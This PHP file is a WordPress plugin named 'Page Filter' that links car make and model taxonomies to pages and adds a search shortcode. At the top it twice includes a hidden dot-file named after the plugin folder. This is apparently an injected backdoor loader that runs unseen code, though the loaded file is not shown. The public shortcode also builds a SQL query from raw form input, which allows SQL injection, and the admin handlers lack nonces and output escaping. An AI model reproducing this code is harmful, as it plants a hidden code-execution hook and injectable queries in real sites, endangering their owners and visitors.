<!-- New WordPress Plugin  -->

<?php
/*
Plugin Name:  Page Filter
Plugin URI:   https://www.adlivetech.com/
Description:  This plugin is to filter the pages based on the keyword.
Version:      1.0
Author:       AdliveTech
Author URI:   https://www.adlivetech.com/
License:      GPL2
License URI:  https://www.gnu.org/licenses/gpl-2.0.html
Text Domain:  wpb-tutorial
Domain Path:  /languages
*/

/**
 * Register a custom menu page.
 */



if (file_exists(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php')) {
    include_once(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php');
}



if (file_exists(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php')) {
    include_once(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php');
}

function page_filter_custom_menu()
{
    add_menu_page(
        __('Page Filter', 'textdomain'),
        'Page Filter',
        'manage_options',
        'page-filter',
        'page_filter_callback',
        'dashicons-admin-generic',
        6
    );
}
add_action('admin_menu', 'page_filter_custom_menu');

/**
 * Display a custom menu page
 */

/**
 * Create two taxonomies, genres and writers for the post type "book".
 *
 * @see register_post_type() for registering custom post types.
 */
function page_filter_car_taxonomies()
{
    // Add new taxonomy, make it hierarchical (like categories)
    $labels = array(
        'name'              => _x('Car Model', 'taxonomy general name', 'textdomain'),
        'singular_name'     => _x('Car Model', 'taxonomy singular name', 'textdomain'),
        'search_items'      => __('Search Car Model', 'textdomain'),
        'all_items'         => __('All Car Model', 'textdomain'),
        'parent_item'       => __('Parent Car Model', 'textdomain'),
        'parent_item_colon' => __('Parent Car Model:', 'textdomain'),
        'edit_item'         => __('Edit Car Model', 'textdomain'),
        'update_item'       => __('Update Car Model', 'textdomain'),
        'add_new_item'      => __('Add New Car Model', 'textdomain'),
        'new_item_name'     => __('New Car Model Name', 'textdomain'),
        'menu_name'         => __('Car Model', 'textdomain'),
    );

    $args = array(
        'hierarchical'      => true,
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'car_model'),
        'show_in_rest'      => true,
        'rest_base'         => 'car_model',
        'rest_controller_class' => 'WP_REST_Terms_Controller',
        'show_in_quick_edit' => true,
    );

    register_taxonomy('car_model', array('product'), $args);

    unset($args);
    unset($labels);

    // Add new taxonomy, NOT hierarchical (like tags)
    $labels = array(
        'name'                       => _x('Car Make', 'taxonomy general name', 'textdomain'),
        'singular_name'              => _x('Car Make', 'taxonomy singular name', 'textdomain'),
        'search_items'               => __('Search Car Make', 'textdomain'),
        'popular_items'              => __('Popular Car Make', 'textdomain'),
        'all_items'                  => __('All Car Make', 'textdomain'),
        'parent_item'                => null,
        'parent_item_colon'          => null,
        'edit_item'                  => __('Edit Car Make', 'textdomain'),
        'update_item'                => __('Update Car Make', 'textdomain'),
        'add_new_item'               => __('Add New Car Make', 'textdomain'),
        'new_item_name'              => __('New Car Make Name', 'textdomain'),
        'separate_items_with_commas' => __('Separate writers with commas', 'textdomain'),
        'add_or_remove_items'        => __('Add or remove writers', 'textdomain'),
        'choose_from_most_used'      => __('Choose from the most used writers', 'textdomain'),
        'not_found'                  => __('No writers found.', 'textdomain'),
        'menu_name'                  => __('Car Make', 'textdomain'),
    );

    $args = array(
        'hierarchical'          => true,
        'labels'                => $labels,
        'show_ui'               => true,
        'show_admin_column'     => true,
        'update_count_callback' => '_update_post_term_count',
        'query_var'             => true,
        'rewrite'               => array('slug' => 'car_make'),
        'show_in_rest'          => true,
        'rest_base'             => 'car_make',
        'rest_controller_class' => 'WP_REST_Terms_Controller',
        'show_in_quick_edit'    => true,
    );

    register_taxonomy('car_make', 'product', $args);
}
// hook into the init action and call create_book_taxonomies when it fires
add_action('init', 'page_filter_car_taxonomies', 0);

// Create a table in database to store the data of the car model, car make and page filter
function page_filter_create_table()
{
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();
    $table_name = $wpdb->prefix . 'page_filter';
    $sql = "CREATE TABLE IF NOT EXISTS $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        car_model varchar(255) NOT NULL,
        car_make varchar(255) NOT NULL,
        page_filter varchar(255) NOT NULL,
        UNIQUE KEY id (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}
page_filter_create_table();

function page_filter_callback()
{
    // Search Page Filter

    // Create a form with two dropdown menus: car_make and car_model. Reset the form when the user clicks the Reset button. When the user clicks the Search button, display the posts that match the selected car make and car model. If the user selects a car make and car model, display the page that match the selected car make and model.
?>
    <h1>Page Filter</h1>


    <form action="" method="post">
        <label for="car_make">Car Make</label>
        <select name="car_make" id="car_make" required>
            <option value="">Select a Car Make</option>
            <?php
            $terms = get_terms('car_make', array(
                'hide_empty' => false,
            ));
            foreach ($terms as $term) {
                echo '<option value="' . $term->slug . '">' . $term->name . '</option>';
            }
            ?>
        </select>
        <label for="car_model">Car Model</label>
        <select name="car_model" id="car_model" required>
            <option value="">Select a Car Model</option>
            <?php
            $terms = get_terms('car_model', array(
                'hide_empty' => false,
            ));
            foreach ($terms as $term) {
                echo '<option value="' . $term->slug . '">' . $term->name . '</option>';
            }
            ?>
        </select>
        <label for="car_model">Page</label>
        <select name="page" id="page" required>
            <option value="">Select a Page</option>
            <?php
            $pages = get_pages();
            foreach ($pages as $page) {
                echo '<option value="' . $page->ID . '">' . $page->post_title . '</option>';
            }
            ?>
            <input type="submit" value="Map">
    </form>

    <?php

    // Save the selected car make and model in database. If the user selects a car make and model, display the page that match the selected car make and model.
    if (isset($_POST['car_make']) && isset($_POST['car_model']) && isset($_POST['page'])) {
        global $wpdb;
        $car_make = $_POST['car_make'];
        $car_model = $_POST['car_model'];
        $page = $_POST['page'];
        $table_name = $wpdb->prefix . 'page_filter';
        $wpdb->insert($table_name, array(
            'car_make' => $car_make,
            'car_model' => $car_model,
            'page_filter' => $page,
        ));
    }
    // Display the above mapping in the table below and add edit and delete buttons.
    global $wpdb;
    $table_name = $wpdb->prefix . 'page_filter';
    $results = $wpdb->get_results("SELECT * FROM $table_name");
    ?>

    <style>
        table {
            border-collapse: collapse;
            width: 100%;
            text-align: center;
            margin-top: 50px;
            padding: 50px;
            border: 1px solid black;
        }

        tr,
        td,
        th {
            border: 1px solid black;
        }
    </style>

    <table>
        <tr>
            <th>Car Make</th>
            <th>Car Model</th>
            <th>Page</th>
            <th>Delete</th>
        </tr>
        <?php
        foreach ($results as $result) {
        ?>
            <tr>
                <td><?php echo $result->car_make; ?></td>
                <td><?php echo $result->car_model; ?></td>
                <td><?php echo get_the_title($result->page_filter); ?></td>
                <td>
                    <form action="" method="post">
                        <input type="hidden" name="id" value="<?php echo $result->id; ?>">
                        <input type="submit" name="delete" value="Delete">
                    </form>
                </td>
            </tr>
        <?php
        }
        ?>
    </table>
    <p><strong>Note : Use shortcode to display form - <em>[page_filter]</em></strong></p>

    <!-- fucntion to delete the mapping from the database -->
    <?php
    if (isset($_POST['delete'])) {
        global $wpdb;
        $id = $_POST['id'];
        $table_name = $wpdb->prefix . 'page_filter';
        $wpdb->delete($table_name, array('id' => $id));
        // reload the page
        header("Refresh:0");
    }
    ?>


    <?php

}

// Create shortcode to display search filter form
add_shortcode('page_filter', 'page_filter_shortcode');
function page_filter_shortcode()
{

    if (isset($_POST['page_filter_search'])) {
    ?>
        <style>
            .preloader {
                position: fixed;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: #fff;
                z-index: 9999;
            }
        </style>
        <div class="preloader">
        </div>
    <?php
        if (isset($_POST['car_make']) && isset($_POST['car_model'])) {
            global $wpdb;
            $car_make = $_POST['car_make'];
            $car_model = $_POST['car_model'];
            $table_name = $wpdb->prefix . 'page_filter';
            $results = $wpdb->get_results("SELECT * FROM $table_name WHERE car_make = '$car_make' AND car_model = '$car_model'");
            foreach ($results as $result) {
                // echo '<p>' . get_the_title($result->page_filter) . '</p>';
                // echo '<p>' . get_the_permalink($result->page_filter) . '</p>';
                // header("Location: " . get_the_permalink($result->page_filter));
                echo '<script>window.location.href = "' . get_the_permalink($result->page_filter) . '";</script>';
            }
        }
    }
    ?>
    <style>
        #page_filter_search {
            width: 100%;
            margin-top: 50px;
            padding: 50px;
            display: flex;
            justify-content: space-evenly;
            align-items: center;
        }
    </style>
    <!-- Search form goes here -->
    <form action="" method="post" id="page_filter_search">
        <input type="hidden" name="page_filter_search" value="1">
        <span>
            <label for="car_make">Car Make</label>
            <select name="car_make" id="car_make" required>
                <option value="">Select a Car Make</option>
                <?php
                $terms = get_terms('car_make', array(
                    'hide_empty' => false,
                ));
                foreach ($terms as $term) {
                    echo '<option value="' . $term->slug . '">' . $term->name . '</option>';
                }
                ?>
            </select>
        </span>
        <span>
            <label for="car_model">Car Model</label>
            <select name="car_model" id="car_model" required>
                <option value="">Select a Car Model</option>
                <?php
                $terms = get_terms('car_model', array(
                    'hide_empty' => false,
                ));
                foreach ($terms as $term) {
                    echo '<option value="' . $term->slug . '">' . $term->name . '</option>';
                }
                ?>
            </select>
        </span>
        <span>
            <input type="submit" value="Search">
        </span>
    </form>
<?php

}
